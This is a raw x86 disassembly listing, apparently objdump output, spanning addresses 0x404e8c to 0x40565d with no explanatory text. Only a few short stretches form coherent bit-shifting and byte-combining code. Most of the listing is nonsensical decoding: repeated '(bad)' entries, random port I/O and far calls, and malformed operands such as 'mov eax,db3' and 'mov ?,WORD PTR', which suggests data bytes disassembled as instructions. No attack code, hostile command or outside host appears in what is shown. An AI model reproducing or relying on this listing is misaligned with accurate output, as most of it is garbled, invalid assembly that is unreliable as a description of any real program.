  404e8c:	mov    BYTE PTR [ecx+0x54],cl
  404e8f:	mov    al,ds:0x3cde5858
  404e94:	out    dx,eax
  404e95:	(bad)  
  404e96:	(bad)  
  404e97:	rol    DWORD PTR [edi-0x6004870c],1
  404e9d:	push   es
  404e9e:	cmp    eax,0x875e6eef
  404ea3:	and    esi,DWORD PTR [esi+0x7]
  404ea6:	mov    dh,0x9
  404ea8:	dec    edi
  404ea9:	ret    0xeea
  404eac:	add    ecx,DWORD PTR [esi-0x49]
  404eaf:	mov    ds:0xfe993cb1,al
  404eb4:	(bad)  
  404eb5:	out    dx,eax
  404eb6:	pop    ds
  404eb7:	mov    eax,0x736a4ec3
  404ebc:	jns    0x404eaf
  404ebe:	es jle 0x404f40
  404ec1:	sahf   
  404ec2:	adc    cl,ch
  404ec4:	aad    0x32
  404ec6:	mov    WORD PTR [ebx+esi*1+0xbd233c7],fs
  404ecd:	ret    0xc8a
  404ed0:	or     BYTE PTR [ebx+0x808cc45],cl
  404ed6:	mov    eax,DWORD PTR [ebp-0x10]
  404ed9:	mov    ecx,DWORD PTR [ebp-0xc]
  404edc:	shrd   eax,ecx,0x2
  404ee0:	shr    ecx,0x2
  404ee3:	mov    ecx,DWORD PTR [ebp-0x10]
  404ee6:	mov    edx,DWORD PTR [ebp-0xc]
  404ee9:	xor    eax,edi
  404eeb:	shl    ecx,0x1e
  404eee:	xor    edx,edx
  404ef0:	or     eax,edx
  404ef2:	lea    eax,[ebp+eax*1-0x4]
  404ef6:	mov    DWORD PTR [ebp-0x34],eax
  404ef9:	mov    eax,DWORD PTR [ebp-0x10]
  404efc:	mov    ecx,DWORD PTR [ebp-0xc]
  404eff:	shrd   eax,ecx,0x2
  404f03:	shr    ecx,0x2
  404f06:	mov    ecx,DWORD PTR [ebp-0x10]
  404f09:	mov    edx,DWORD PTR [ebp-0xc]
  404f0c:	xor    eax,edi
  404f0e:	shl    ecx,0x1e
  404f11:	mov    ecx,DWORD PTR [ebp-0x14]
  404f14:	xor    edx,edx
  404f16:	or     eax,edx
  404f18:	mov    cl,BYTE PTR [eax+ecx*1]
  404f1b:	mov    eax,DWORD PTR [ebp-0x34]
  404f1e:	add    BYTE PTR [eax],cl
  404f20:	mov    eax,DWORD PTR [ebp-0x60]
  404f23:	mov    ecx,DWORD PTR [ebp-0x5c]
  404f26:	shrd   eax,ecx,0x2
  404f2a:	shr    ecx,0x2
  404f2d:	mov    ecx,DWORD PTR [ebp-0x60]
  404f30:	mov    edx,DWORD PTR [ebp-0x5c]
  404f33:	xor    eax,edi
  404f35:	xor    edx,edx
  404f37:	or     eax,edx
  404f39:	lea    eax,[ebp+eax*1-0x4]
  404f3d:	mov    DWORD PTR [ebp-0x34],eax
  404f40:	mov    eax,DWORD PTR [ebp-0x60]
  404f43:	shl    ecx,0x1e
  404f46:	mov    ecx,DWORD PTR [ebp-0x5c]
  404f49:	shrd   eax,ecx,0x2
  404f4d:	shr    ecx,0x2
  404f50:	mov    ecx,DWORD PTR [ebp-0x60]
  404f53:	mov    edx,DWORD PTR [ebp-0x5c]
  404f56:	xor    eax,edi
  404f58:	xor    edx,edx
  404f5a:	or     eax,edx
  404f5c:	mov    edx,DWORD PTR [ebp+0x14]
  404f5f:	shl    ecx,0x1e
  404f62:	mov    ecx,DWORD PTR [ebp-0x14]
  404f65:	mov    cl,BYTE PTR [eax+ecx*1]
  404f68:	mov    eax,DWORD PTR [ebp-0x34]
  404f6b:	or     BYTE PTR [eax],cl
  404f6d:	jmp    0x40530e
  404f72:	mov    DWORD PTR [edx],ecx
  404f74:	push   0xabac68c5
  404f79:	mov    al,BYTE PTR [edi-0x216df5c0]
  404f7f:	jecxz  0x404ffd
  404f81:	xchg   edx,eax
  404f82:	mov    esi,0xbdbebe11
  404f87:	les    edi,FWORD PTR [esi-0x529b6742]
  404f8d:	fisub  DWORD PTR [ebx-0x582a2ac6]
  404f93:	mov    eax,0xd1375011
  404f98:	jl     0x404f80
  404f9a:	adc    dh,BYTE PTR ds:[esi-0x60b77bd1]
  404fa1:	pop    ecx
  404fa2:	xor    edi,DWORD PTR [ebp+0x9]
  404fa5:	repnz fsubr QWORD PTR [eax+0x6cf3ef76]
  404fac:	and    eax,DWORD PTR [eax-0x2]
  404faf:	mov    eax,ds:0xbbf6fd14
  404fb4:	fisttp DWORD PTR [eax-0x4e]
  404fb7:	and    eax,0x53cc5a69
  404fbc:	mov    ch,0xe2
  404fbe:	cmp    eax,0x2d510cbd
  404fc3:	test   dh,al
  404fc5:	sbb    eax,DWORD PTR [edx]
  404fc7:	lea    ecx,[ecx+0x5d923adf]
  404fcd:	psubsw mm4,QWORD PTR [edx-0x4e]
  404fd1:	stos   DWORD PTR es:[edi],eax
  404fd2:	mov    eax,db3
  404fd5:	pushf  
  404fd6:	mov    eax,ds:0x6985e90c
  404fdb:	cmp    al,0xf8
  404fdd:	sbb    al,0xec
  404fdf:	ins    BYTE PTR es:[edi],dx
  404fe0:	in     al,0xa1
  404fe2:	shl    edx,cl
  404fe4:	out    dx,eax
  404fe5:	mov    edi,0x8278f24a
  404fea:	pop    eax
  404feb:	fdivr  QWORD PTR [edx-0x67cdc1fe]
  404ff1:	sbb    al,0xe6
  404ff3:	in     eax,0x24
  404ff5:	repz retf 
  404ff7:	cmpxchg BYTE PTR [edi-0x54],dh
  404ffb:	test   al,0x40
  404ffd:	fadd   QWORD PTR [esi-0x41b58fca]
  405003:	adc    ebx,ebx
  405005:	xchg   esi,eax
  405006:	jno    0x40503a
  405008:	idiv   DWORD PTR [esi+edi*4+0x53a05129]
  40500f:	into   
  405010:	in     ax,0x35
  405013:	xchg   ebx,eax
  405014:	add    ebp,DWORD PTR [ebp-0x566cc848]
  40501a:	jl     0x40500c
  40501c:	add    dh,bh
  40501e:	lock xlat BYTE PTR ds:[ebx]
  405020:	out    0x39,al
  405022:	sub    BYTE PTR [ebp+ecx*8+0x52],ah
  405026:	push   ecx
  405027:	nop
  405028:	pop    esi
  405029:	ror    edi,cl
  40502b:	popf   
  40502c:	enter  0x6d3f,0x2b
  405030:	in     al,0x54
  405032:	outs   dx,DWORD PTR ds:[esi]
  405033:	inc    edi
  405034:	pusha  
  405035:	xor    BYTE PTR ds:0xb261d721,bh
  40503b:	dec    ecx
  40503c:	adc    esp,ebx
  40503e:	repz lock lea eax,[esi-0x63]
  405043:	aaa    
  405044:	aas    
  405045:	iret   
  405046:	cli    
  405047:	pop    esp
  405049:	lea    ebp,[ebx+0x2a]
  40504c:	xchg   ecx,eax
  40504d:	daa    
  40504e:	popf   
  40504f:	pop    esp
  405050:	ds push ecx
  405052:	icebp  
  405053:	or     eax,0x751cec9f
  405058:	(bad)  
  405059:	sub    ah,BYTE PTR [esp+edx*8+0x30172d27]
  405060:	sub    ah,BYTE PTR [ebp-0xc]
  405063:	mov    ch,BYTE PTR [esi]
  405065:	sub    DWORD PTR [ebp+0x6d6e4cd0],ebp
  40506b:	pop    edi
  40506c:	cwde   
  40506d:	cmp    esp,edi
  40506f:	adc    DWORD PTR [eax],ebp
  405071:	add    eax,DWORD PTR [edi]
  405073:	out    dx,eax
  405074:	sub    ebx,ebp
  405076:	shr    DWORD PTR [edx+edx*4],cl
  405079:	cmp    bl,ah
  40507b:	sbb    DWORD PTR [ecx+0x3b621cec],ecx
  405081:	sar    BYTE PTR [esi+0x364583d6],cl
  405087:	loope  0x40509e
  405089:	mov    ?,WORD PTR [eax-0x4d]
  40508c:	ds shl ecx,cl
  40508f:	test   eax,0x27670d47
  405094:	pop    esp
  405095:	cmp    bh,bh
  405097:	in     eax,dx
  405098:	jnp    0x4050ac
  40509a:	xchg   DWORD PTR [edx+0x65],edx
  40509d:	daa    
  40509e:	sbb    esp,DWORD PTR [ecx+0x985f44e]
  4050a4:	addr16 out 0x8a,eax
  4050a7:	fst    QWORD PTR [eax+0x5d26fe72]
  4050ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050ae:	mov    dl,0x65
  4050b0:	in     eax,dx
  4050b1:	inc    eax
  4050b2:	stos   BYTE PTR es:[edi],al
  4050b3:	cmp    bh,bl
  4050b5:	ficomp WORD PTR [edi-0x56]
  4050b8:	mov    DWORD PTR [eax-0x53],ebx
  4050bb:	pop    eax
  4050bc:	jb     0x4050ab
  4050be:	ins    BYTE PTR es:[edi],dx
  4050bf:	cmp    bh,BYTE PTR [ebx+0x60]
  4050c2:	or     eax,0xec59f4a6
  4050c7:	sub    edx,DWORD PTR [edx+edx*8-0x76290532]
  4050ce:	add    dl,BYTE PTR [edi]
  4050d0:	add    BYTE PTR [ebx+esi*2],cl
  4050d3:	pop    ds
  4050d4:	dec    esp
  4050d5:	js     0x405139
  4050d7:	mov    ebp,0xe585db42
  4050dc:	jecxz  0x4050bc
  4050de:	stc    
  4050df:	jle    0x405067
  4050e1:	inc    eax
  4050e2:	clc    
  4050e3:	mov    al,0x40
  4050e5:	mov    ch,0x4f
  4050e7:	out    0x52,al
  4050e9:	pop    ebx
  4050ea:	jmp    0x4050e0
  4050ec:	arpl   sp,dx
  4050ee:	out    0xe2,eax
  4050f0:	mov    ebx,0x36adb40a
  4050f5:	shl    eax,cl
  4050f7:	pushf  
  4050f8:	push   cs
  4050f9:	or     BYTE PTR [edi],cl
  4050fb:	std    
  4050fc:	and    al,0x4d
  4050fe:	xchg   esp,eax
  4050ff:	lock cmps BYTE PTR ss:[esi],BYTE PTR es:[edi]
  405102:	(bad)  
  405103:	sbb    al,0x5a
  405105:	push   cs
  405106:	xor    eax,0xddb7125a
  40510b:	les    edi,FWORD PTR [ebx]
  40510d:	ds mov ch,dl
  405110:	xchg   edi,eax
  405112:	mov    ebp,0xab9e02fd
  405117:	mov    al,0x4f
  405119:	lea    ebx,[ebp+ebp*2+0xc]
  40511d:	and    DWORD PTR [ebp+0x79],eax
  405120:	fidiv  WORD PTR [eax]
  405122:	cs sub eax,0x422b58a0
  405128:	cmp    DWORD PTR [edi],edx
  40512a:	test   BYTE PTR [ebp-0x33],bh
  40512d:	sub    ah,BYTE PTR cs:[edx+ecx*1-0x2ee68bd0]
  405135:	(bad)  
  405136:	cdq    
  405137:	cwde   
  405138:	fdivr  DWORD PTR [edi-0x70]
  40513b:	add    eax,0xbd1503d2
  405140:	pop    eax
  405141:	rcr    DWORD PTR [edx+0x5cb78f86],0x78
  405148:	pop    esi
  405149:	sub    DWORD PTR [esi+0x7057ac8a],ebp
  40514f:	push   cs
  405150:	xor    al,0x4e
  405152:	jmp    0x405171
  405154:	lock jp 0x405160
  405157:	dec    ecx
  405158:	sar    ch,cl
  40515a:	sub    edx,DWORD PTR [edx]
  40515c:	xor    al,0x99
  40515e:	add    ecx,DWORD PTR [edx+0x72]
  405161:	inc    esp
  405162:	mov    DWORD PTR [edi],0xbcdfa59e
  405168:	and    ebx,DWORD PTR [ecx+eax*2]
  40516b:	pop    eax
  40516c:	out    dx,eax
  40516d:	xor    al,0x30
  40516f:	out    dx,al
  405170:	xor    eax,0x81001675
  405175:	mov    WORD PTR [edi+edx*8-0x74e19345],fs
  40517c:	mov    al,0xee
  40517e:	int3   
  40517f:	pop    ds
  405180:	mov    ebp,0x7e9ed45b
  405185:	mov    esp,0xe0599437
  40518a:	ret    
  40518b:	out    0xfd,eax
  40518d:	lds    esp,FWORD PTR [esi]
  40518f:	in     eax,0x9a
  405191:	popa   
  405192:	fild   QWORD PTR [ecx-0x43]
  405195:	sub    DWORD PTR [ebx-0x31a44316],esi
  40519b:	adc    BYTE PTR ds:0x35777fe3,0x6e
  4051a2:	xchg   edi,eax
  4051a3:	xor    eax,0x7fcb5382
  4051a8:	cdq    
  4051a9:	xor    edi,eax
  4051ab:	into   
  4051ac:	je     0x405203
  4051ae:	push   eax
  4051af:	in     al,dx
  4051b0:	enter  0xe5d3,0xb4
  4051b4:	out    dx,al
  4051b5:	add    al,0x1c
  4051b7:	shl    esi,1
  4051b9:	inc    ebp
  4051ba:	test   DWORD PTR [ecx],esi
  4051bc:	xlat   BYTE PTR ds:[ebx]
  4051bd:	popf   
  4051be:	xchg   ecx,eax
  4051bf:	shr    DWORD PTR [ecx+0x32],0xac
  4051c3:	retf   
  4051c4:	xchg   edx,eax
  4051c5:	jb     0x405162
  4051c7:	mov    al,0x54
  4051c9:	outs   dx,DWORD PTR ds:[esi]
  4051ca:	xchg   ebx,eax
  4051cb:	aaa    
  4051cc:	push   ss
  4051cd:	call   0xc2ef:0xf5b92bf4
  4051d4:	nop
  4051d5:	scas   eax,DWORD PTR es:[edi]
  4051d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051d7:	retf   0xe53
  4051da:	ror    edx,1
  4051dc:	iret   
  4051dd:	push   ebx
  4051de:	xor    al,0x7a
  4051e0:	stos   BYTE PTR es:[edi],al
  4051e1:	inc    ecx
  4051e2:	inc    ebp
  4051e3:	inc    DWORD PTR [edi-0x13]
  4051e6:	push   edi
  4051e7:	lds    ecx,FWORD PTR [edx-0x3d0d1770]
  4051ed:	cmp    eax,0xb11c8439
  4051f2:	leave  
  4051f3:	repz push ecx
  4051f5:	imul   esi,DWORD PTR [edi-0x63],0x26
  4051f9:	mov    ecx,0xbf930a8c
  4051fe:	push   DWORD PTR [ecx]
  405200:	dec    ebx
  405201:	(bad)  
  405202:	fldenv [esi+0x7718eba6]
  405208:	or     dh,BYTE PTR [esi]
  40520a:	sbb    DWORD PTR [esi+eax*1-0x65],esp
  40520e:	cmc    
  40520f:	les    esi,FWORD PTR [edx+0x29]
  405212:	xor    BYTE PTR [esi],al
  405214:	inc    edx
  405215:	rcl    DWORD PTR [edi],1
  405217:	push   0x39
  405219:	or     eax,0x94518f11
  40521e:	jns    0x4051cc
  405220:	sahf   
  405221:	imul   edx,DWORD PTR [ecx],0xffffffc0
  405224:	dec    edx
  405225:	dec    edx
  405226:	push   0x9bc071f6
  40522b:	out    0xd5,eax
  40522d:	pushf  
  40522e:	ss mov dh,0x57
  405231:	aam    0x7c
  405233:	mov    ds:0x825a242d,al
  405238:	cmp    BYTE PTR [ebp+0x62979b5],0xa3
  40523f:	mov    ds:0xdca807ad,eax
  405244:	je     0x4051dc
  405246:	inc    edi
  405247:	inc    edx
  405248:	in     al,dx
  405249:	mov    edx,0xecc00502
  40524e:	outs   dx,BYTE PTR ds:[esi]
  40524f:	ss push ds
  405251:	repnz push es
  405253:	fiadd  DWORD PTR [edi+0x72dbd55c]
  405259:	xor    DWORD PTR [eax-0x18],ebx
  40525c:	sub    ebp,edx
  40525e:	(bad)  
  40525f:	outs   dx,DWORD PTR ds:[esi]
  405260:	ja     0x4052af
  405262:	inc    ecx
  405263:	add    eax,0x7f933c60
  405268:	neg    DWORD PTR [edx-0x1c2d6bdb]
  40526e:	cdq    
  40526f:	test   BYTE PTR [esi+0x79],bl
  405272:	out    dx,eax
  405273:	gs je  0x4052f4
  405276:	push   ds
  405277:	or     al,0x58
  405279:	call   0x295823e2
  40527e:	push   ss
  40527f:	or     edi,DWORD PTR ds:0xa3ef18e0
  405285:	bound  ebx,QWORD PTR ds:0x58ac1712
  40528b:	fstp   TBYTE PTR [edx]
  40528d:	cwde   
  40528e:	stos   DWORD PTR es:[edi],eax
  40528f:	or     ch,BYTE PTR [edi+0x40aec49b]
  405295:	aaa    
  405296:	push   0x5b4ccee
  40529b:	fwait
  40529c:	jnp    0x4052de
  40529e:	mov    bh,0x77
  4052a0:	mov    dh,0xb4
  4052a2:	std    
  4052a3:	(bad)  
  4052a4:	loop   0x405324
  4052a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052a7:	pop    ebx
  4052a8:	pop    ss
  4052a9:	xchg   edx,eax
  4052aa:	ja     0x405329
  4052ac:	pop    es
  4052ad:	stos   DWORD PTR es:[edi],eax
  4052ae:	shl    DWORD PTR [ebx],0xab
  4052b1:	and    esp,DWORD PTR [edi+ebp*8]
  4052b4:	cdq    
  4052b5:	sbb    cl,cl
  4052b7:	sub    edi,DWORD PTR [eax+0x6d]
  4052ba:	sub    eax,ecx
  4052bc:	sbb    eax,0x3997a3a1
  4052c1:	jecxz  0x4052a7
  4052c3:	cmp    ah,ch
  4052c5:	es scas eax,DWORD PTR es:[edi]
  4052c7:	push   edi
  4052c8:	enter  0xf09b,0xb0
  4052cc:	es je  0x405323
  4052cf:	pop    es
  4052d0:	aam    0x55
  4052d2:	or     DWORD PTR [ecx+0x2d902c5c],esi
  4052d8:	push   edi
  4052d9:	aam    0x82
  4052db:	xor    al,0x7a
  4052dd:	(bad)  
  4052de:	fwait
  4052df:	push   edx
  4052e0:	out    dx,al
  4052e1:	dec    ebp
  4052e2:	aam    0x44
  4052e4:	or     eax,0xbe23913e
  4052e9:	paddw  mm7,QWORD PTR [edx-0x43]
  4052ed:	sbb    BYTE PTR [edi+0x7d],dh
  4052f0:	mov    BYTE PTR [edi],dh
  4052f2:	cmc    
  4052f3:	out    dx,eax
  4052f4:	in     al,dx
  4052f5:	add    BYTE PTR [ebx],al
  4052f7:	aaa    
  4052f8:	push   eax
  4052f9:	ficom  DWORD PTR [edx]
  4052fb:	xor    ah,BYTE PTR [eax+0x51]
  4052fe:	mov    edi,0xe7e90070
  405303:	lds    ecx,FWORD PTR [edx+eax*4+0x4dd52378]
  40530a:	mov    BYTE PTR ds:0x458ba89f,0x10
  405311:	mov    ecx,eax
  405313:	shrd   ecx,edx,0x2
  405317:	shl    eax,0x1e
  40531a:	shr    edx,0x2
  40531d:	mov    DWORD PTR [ebp+0x14],edx
  405320:	mov    DWORD PTR [ebp+0x14],eax
  405323:	xor    edx,edx
  405325:	mov    eax,ecx
  405327:	jmp    0x4056c8
  40532c:	sub    eax,0x846700b2
  405331:	jnp    0x4052e9
  405333:	mov    esp,0xe3d964fe
  405338:	adc    al,0x45
  40533a:	sbb    dl,cl
  40533c:	mov    ebp,0xbdbebe17
  405341:	les    edi,FWORD PTR [esi+0x3cd7bebe]
  405347:	fild   DWORD PTR [eax-0x36]
  40534a:	lahf   
  40534b:	sar    BYTE PTR [ecx],cl
  40534d:	rol    DWORD PTR [esi-0x57654cf7],1
  405353:	push   esi
  405354:	mov    ebp,0xbb19307d
  405359:	ds mov ch,0xce
  40535c:	inc    ebp
  40535d:	inc    ecx
  40535e:	add    ebp,DWORD PTR [edx]
  405360:	cmp    DWORD PTR [ebx+0x4c],eax
  405363:	gs nop
  405365:	imul   esi,esi,0xea59d4cb
  40536b:	adc    BYTE PTR [edx],bl
  40536d:	lock dec ebx
  40536f:	xlat   BYTE PTR ds:[ebx]
  405370:	ret    0xa344
  405373:	sub    ecx,ecx
  405375:	push   es
  405376:	mov    esp,0xadde48c8
  40537b:	imul   ebp,DWORD PTR [edi+0x7d65687],0xffffffd0
  405382:	xor    BYTE PTR [ebx],bh
  405384:	or     edx,DWORD PTR [esi]
  405386:	cdq    
  405387:	jns    0x40538d
  405389:	sbb    BYTE PTR [edi-0x45],ch
  40538c:	adc    DWORD PTR [esi-0x7],0xd96ba5d1
  405393:	xlat   BYTE PTR ds:[ebx]
  405394:	mov    DWORD PTR [esi+eiz*2],ebp
  405397:	adc    al,0x8b
  405399:	out    0xff,eax
  40539b:	out    dx,al
  40539c:	or     eax,0xca28607e
  4053a2:	xchg   ecx,eax
  4053a3:	shr    ch,cl
  4053a5:	jmp    0x82cb8962
  4053aa:	lea    edx,[esi+0x60]
  4053ad:	sbb    dl,BYTE PTR [edi+0x56]
  4053b0:	or     eax,0xfbe5d738
  4053b5:	xor    DWORD PTR [edi],0xe8722e61
  4053bb:	push   ebx
  4053bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053bd:	stos   WORD PTR es:[edi],ax
  4053bf:	and    eax,0xb69bd039
  4053c4:	inc    esi
  4053c5:	lods   eax,DWORD PTR ds:[esi]
  4053c6:	push   ecx
  4053c7:	xchg   esp,eax
  4053c8:	xlat   BYTE PTR ds:[ebx]
  4053c9:	xor    edx,ebx
  4053cb:	sti    
  4053cc:	or     cl,dh
  4053ce:	cmp    eax,0x2484d098
  4053d3:	fidiv  WORD PTR [eiz*1+0x71db9097]
  4053da:	push   edx
  4053db:	push   ecx
  4053dc:	mov    cl,0x23
  4053de:	test   al,0xe8
  4053e0:	loopne 0x405435
  4053e2:	mov    ch,0x2d
  4053e4:	push   edx
  4053e6:	stos   BYTE PTR es:[edi],al
  4053e7:	stc    
  4053e8:	pop    ebx
  4053e9:	(bad)  
  4053eb:	into   
  4053ec:	mov    dl,0xfd
  4053ee:	outs   dx,DWORD PTR ds:[esi]
  4053ef:	mov    edi,0x31f1dd2a
  4053f4:	ins    BYTE PTR es:[edi],dx
  4053f5:	leave  
  4053f6:	push   edx
  4053f7:	and    BYTE PTR [ecx+0x56],al
  4053fa:	ds mov bh,0xfa
  4053fd:	cmp    DWORD PTR [ecx],0x1e
  405400:	lock inc bp
  405403:	jbe    0x40542d
  405405:	mov    esi,DWORD PTR [esi-0x78f35c91]
  40540b:	pop    edi
  40540c:	dec    esp
  40540d:	mov    bl,0xde
  40540f:	gs je  0x40546c
  405412:	js     0x40544d
  405414:	mov    ds,WORD PTR [ebp+ebp*2-0x537665bd]
  40541b:	xchg   bl,dl
  40541d:	call   0x866b:0xea8bf2ce
  405424:	add    DWORD PTR [ebx+0x4c7cb3cd],0x7706dd0f
  40542e:	xchg   ebp,eax
  40542f:	xchg   esi,eax
  405430:	loopne 0x4053db
  405432:	scas   al,BYTE PTR es:[edi]
  405433:	push   ebx
  405434:	loope  0x4053f8
  405436:	mov    edi,0xf93d362
  40543b:	fcmovb st,st(3)
  40543d:	xchg   esp,eax
  40543e:	cmp    al,0x4c
  405440:	ins    BYTE PTR es:[edi],dx
  405441:	sub    dh,BYTE PTR [eax+ecx*2+0x3b45d9f3]
  405448:	mov    esp,0x1a549f1e
  40544d:	ja     0x4054bd
  40544f:	dec    ebp
  405450:	call   0xa5663d44
  405455:	pop    edi
  405456:	out    0xc1,eax
  405458:	jmp    0x94ce0cf1
  40545d:	add    eax,0x5096e09c
  405462:	or     DWORD PTR [ecx+0x14],esp
  405465:	add    eax,0x6dae09a1
  40546a:	out    0x28,al
  40546c:	add    eax,DWORD PTR [ebp+esi*8-0x98fa733]
  405473:	retf   0xd5dd
  405476:	mov    esp,DWORD PTR [ebx]
  405478:	(bad)  
  40547a:	jno    0x405463
  40547c:	clc    
  40547d:	arpl   WORD PTR [ebp+0x3d],dx
  405480:	sbb    DWORD PTR [esp+edx*1+0x7c48e8e3],edi
  405487:	add    DWORD PTR [edi-0x38a586a9],edx
  40548d:	stos   DWORD PTR es:[edi],eax
  40548e:	add    bl,ah
  405490:	call   0x9025b5ac
  405495:	lahf   
  405496:	retf   
  405497:	ds inc ebp
  405499:	ds push ebx
  40549b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40549c:	mov    esi,0x11e4f6f5
  4054a1:	fdiv   DWORD PTR [edx+0xd3b4108]
  4054a7:	xchg   edx,eax
  4054a8:	addr16 push ecx
  4054aa:	loopne 0x405443
  4054ac:	ins    BYTE PTR es:[edi],dx
  4054ad:	sub    ebp,DWORD PTR [ecx-0xc]
  4054b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054b1:	sub    edx,ecx
  4054b3:	mov    al,0x5e
  4054b5:	int    0xc3
  4054b7:	and    bh,BYTE PTR [esi-0x39108e98]
  4054bd:	scas   al,BYTE PTR es:[edi]
  4054be:	mov    bh,0x35
  4054c0:	out    0x92,al
  4054c2:	dec    BYTE PTR [eax+0x2ba79927]
  4054c8:	sub    eax,0x8ad97ad1
  4054cd:	jns    0x4054af
  4054cf:	jbe    0x4054cb
  4054d1:	jg     0x4054e5
  4054d3:	sbb    bh,al
  4054d5:	xor    eax,0x9bfb58d8
  4054da:	xchg   ebx,eax
  4054db:	mov    al,0xc2
  4054dd:	sub    al,BYTE PTR [eax-0x4d4fa06f]
  4054e3:	loop   0x405472
  4054e5:	add    al,BYTE PTR [edi]
  4054e7:	fld    QWORD PTR [esi+0x21ac8bbc]
  4054ed:	xchg   ecx,eax
  4054ee:	sahf   
  4054ef:	jle    0x40547a
  4054f1:	aaa    
  4054f2:	adc    eax,0xc93aeb2e
  4054f7:	pop    ds
  4054f8:	xor    esp,DWORD PTR [esi]
  4054fa:	and    dh,BYTE PTR [edx-0x62]
  4054fd:	jb     0x4054ba
  4054ff:	jle    0x40554d
  405501:	adc    al,0x19
  405503:	pop    edx
  405504:	jb     0x405519
  405506:	mov    eax,0x953b07ef
  40550b:	sbb    ch,bh
  40550d:	or     BYTE PTR [esi-0x2d8c74e],ah
  405513:	stos   BYTE PTR es:[edi],al
  405514:	cmc    
  405515:	sub    ah,bh
  405517:	pop    ss
  405518:	out    dx,al
  405519:	sar    DWORD PTR [edi+0x3ee5894e],cl
  40551f:	push   ebx
  405520:	fwait
  405521:	std    
  405522:	mov    dh,0x80
  405524:	mov    ecx,ebx
  405526:	pop    edx
  405527:	in     eax,dx
  405528:	dec    edx
  405529:	aas    
  40552a:	mov    bl,bh
  40552c:	pop    ebx
  40552d:	scas   eax,DWORD PTR es:[edi]
  40552e:	cmp    al,0x67
  405530:	mov    dl,0x1b
  405532:	or     cl,ch
  405534:	clc    
  405535:	xchg   ebx,eax
  405536:	push   ds
  405537:	push   ds
  405538:	cmp    esp,DWORD PTR [edx+0x154f9ced]
  40553e:	and    eax,0xdccb3d17
  405543:	mov    dl,ah
  405545:	dec    edx
  405546:	mov    WORD PTR [edi-0x7c],?
  405549:	cmp    al,0x6f
  40554b:	adc    bh,al
  40554d:	cmc    
  40554e:	enter  0x5ef,0xca
  405552:	dec    esi
  405553:	pop    DWORD PTR [ecx]
  405555:	sbb    dl,dh
  405557:	dec    edi
  405558:	cmp    bh,BYTE PTR [ebp+0x62f02046]
  40555e:	push   cs
  40555f:	mov    ?,WORD PTR [ebp+0x7]
  405562:	retf   0xe63b
  405565:	dec    ecx
  405566:	mov    ds:0x5885eb79,al
  40556b:	mul    BYTE PTR [edi]
  40556d:	mov    ecx,0xdcd38adf
  405572:	cld    
  405573:	in     al,dx
  405574:	adc    esp,DWORD PTR ss:[edi]
  405577:	imul   esp,DWORD PTR [eax+0x18f62ecd],0xca751480
  405581:	jg     0x405522
  405583:	jne    0x405538
  405585:	push   esp
  405586:	test   eax,0x3d066f11
  40558b:	call   DWORD PTR [edi]
  40558d:	mov    esp,0xd0a99d26
  405592:	mov    ch,0x6d
  405594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405595:	sti    
  405596:	mov    esp,?
  405598:	loopne 0x4055d2
  40559a:	ss mov ah,0x3d
  40559d:	and    al,0xbb
  40559f:	outs   dx,BYTE PTR ds:[esi]
  4055a0:	mov    al,0xa
  4055a2:	push   ebp
  4055a3:	mov    esp,0xad051bf5
  4055a8:	adc    BYTE PTR [edx-0x63170a39],al
  4055ae:	ins    DWORD PTR es:[edi],dx
  4055af:	cmp    BYTE PTR [esi-0x79],ch
  4055b2:	add    ebp,esi
  4055b4:	mov    eax,0xe4c12c40
  4055b9:	cmp    al,0x25
  4055bb:	aaa    
  4055bc:	add    DWORD PTR [edi-0x7038371a],ebx
  4055c2:	std    
  4055c3:	add    BYTE PTR ds:0x9e1f2fc1,bl
  4055c9:	fstp   QWORD PTR [ebp+0x45]
  4055cc:	std    
  4055cd:	inc    esi
  4055ce:	lahf   
  4055cf:	cwde   
  4055d0:	pop    DWORD PTR [eax-0x581693ec]
  4055d6:	stos   BYTE PTR es:[edi],al
  4055d7:	dec    esp
  4055d8:	xor    edi,DWORD PTR [ecx]
  4055da:	xchg   esi,eax
  4055db:	push   edx
  4055dc:	pop    ebp
  4055dd:	iret   
  4055de:	mov    ecx,0x2a9bf02a
  4055e3:	push   ebp
  4055e4:	push   ds
  4055e5:	cmp    BYTE PTR [edx],0x51
  4055e8:	loopne 0x40560f
  4055ea:	loop   0x4055c9
  4055ec:	and    al,0x24
  4055ee:	xlat   BYTE PTR ds:[ebx]
  4055ef:	jmp    0x40f911bf
  4055f4:	shl    DWORD PTR cs:[esi-0x70],cl
  4055f8:	mov    ?,WORD PTR [edi]
  4055fa:	stc    
  4055fb:	adc    al,0x20
  4055fd:	scas   al,BYTE PTR es:[edi]
  4055fe:	vunpckhps xmm2,xmm3,XMMWORD PTR [eax]
  405602:	rcl    DWORD PTR [ebx-0x7a],0x66
  405606:	and    al,0xfc
  405608:	sub    al,BYTE PTR ds:0xb383c418
  40560e:	sub    dl,BYTE PTR [edi-0x8]
  405611:	int    0x3
  405613:	xchg   edi,eax
  405614:	pop    edx
  405615:	pop    esi
  405616:	pop    edx
  405617:	arpl   WORD PTR [ebx],bx
  405619:	xchg   ebx,eax
  40561a:	cmp    al,0xa0
  40561c:	in     eax,dx
  40561d:	nop
  40561e:	scas   al,BYTE PTR es:[edi]
  40561f:	inc    edi
  405620:	mov    al,0xde
  405622:	not    BYTE PTR [ebp-0x6d30df08]
  405628:	push   edi
  405629:	mov    BYTE PTR [ebp+ebx*4-0x58],dh
  40562d:	sub    ebx,DWORD PTR [ebx]
  40562f:	add    eax,0x5a813660
  405634:	adc    bh,bl
  405636:	or     edx,DWORD PTR [eax+ebx*1]
  405639:	retf   0xfb9c
  40563c:	mov    dl,BYTE PTR [ecx-0x50f56496]
  405642:	pop    ebp
  405643:	sti    
  405644:	popf   
  405645:	fucom  st(5)
  405647:	mov    ebp,0xa5e6d6f3
  40564c:	pusha  
  40564d:	xlat   BYTE PTR ds:[ebx]
  40564e:	inc    ebp
  40564f:	mov    ds:0xb0104ddd,al
  405654:	cmp    BYTE PTR [ecx+0x207d00d5],al
  40565a:	stos   BYTE PTR es:[edi],al
  40565b:	jno    0x4055ec
  40565d:	in     eax,0x62
